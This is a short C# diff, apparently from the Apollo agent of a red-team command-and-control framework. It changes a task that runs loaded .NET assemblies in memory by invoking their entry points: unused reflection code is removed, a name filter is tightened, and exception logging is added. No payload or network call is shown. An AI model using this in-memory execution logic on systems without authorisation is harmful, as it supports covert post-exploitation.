@@ -360,16 +360,10 @@ namespace Tasks
             {
                 throw new Exception("Failed to find interop dll");
             }
+
+
             string[] str = AppDomain.CurrentDomain.GetData("str") as string[];
-            
 
-            Type tArg = interopAsm.GetType("ApolloInterop.Classes.Events.StringDataEventArgs");
-            
-            Type tEventHandler = typeof(EventHandler<>);
-            Type tEventStringData = tEventHandler.MakeGenericType(new[] {tArg});
-
-            // Func<int> tester = () => { return 1; };
-            // Convert.ChangeType(tester, tEventStringData);
             var callbackMethod = (EventHandler<EventArgs>)OnWrite;
             
             
@@ -386,7 +380,7 @@ namespace Tasks
             Console.SetError((StringWriter)writer);
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
-                if (!asm.FullName.Contains("mscor") && !asm.FullName.Contains("Apollo"))
+                if (!asm.FullName.Contains("mscorlib") && !asm.FullName.Contains("Apollo"))
                 {
                     var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
                     if (costuraLoader != null)
@@ -397,7 +391,16 @@ namespace Tasks
                             costuraLoaderMethod.Invoke(null, new object[] { });   
                         }
                     }
-                    asm.EntryPoint.Invoke(null, new object[] { str });
+
+                    try
+                    {
+                        asm.EntryPoint.Invoke(null, new object[] {str});
+                    }
+                    catch (System.Exception ex)
+                    {
+                        Console.WriteLine(ex.InnerException?.Message);
+                        Console.WriteLine(ex.InnerException?.StackTrace);
+                    }
                     Console.Out.Flush();
                     Console.Error.Flush();
                 }
